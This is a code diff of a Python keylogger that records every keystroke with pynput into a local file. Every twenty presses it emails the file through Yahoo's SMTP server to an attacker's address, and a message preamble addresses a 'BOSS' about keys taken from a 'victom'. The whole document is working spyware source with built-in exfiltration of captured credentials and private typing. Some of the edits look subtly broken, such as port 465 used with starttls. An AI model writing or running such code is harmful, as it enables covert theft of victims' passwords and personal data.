@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener 
 
 
-global counter
+counter =1
 
 
 def mail_it():
@@ -20,8 +20,9 @@ def mail_it():
 
 	#creating message
 	msg = MIMEMultipart("related")
-	msg['Subject'] = 'ignore (testing)'
-	msg.preamble = "BOSS we got some keys of victom"
+	msg['Subject'] = 'ignore'
+	msg['To'] = destination_mail
+	msg.preamble = "BOSS we"
 
 	with open("keyslogging.txt",'r') as plaintxt:
 		plain = plaintxt.read()
@@ -32,11 +33,11 @@ def mail_it():
 
 
 	#initializing smpt connection and sending mail
-	server = smtplib.SMTP("smtp.yahoo.com", 587) 
+	server = smtplib.SMTP("smtp.yahoo.com", 465) 
 	server.starttls()
 	server.ehlo()
 	server.login(mail,password)
-	server.sendmail(mail,destination_mail ,msg.as_string())
+	server.sendmail(mail,destination_mail ,MIMEText(msg.as_string()))
 	#server.attach(gmail,destination_mail,path)
 
 	server.quit()
@@ -44,10 +45,11 @@ def mail_it():
 	
 def on_press(key):
 	write_1(key)
-	
+
 	global counter
 	counter +=1
-	if counter%20 ==0:
+	print(counter)
+	if counter%20 == 0:
 		mail_it()
 
 
@@ -66,7 +68,6 @@ def write_1(var):
 			new_var = str(var).replace("'",'')
 			f.write(new_var)
 		f.write(" ")
-		counter = counter +1
 		f.close()
 
 
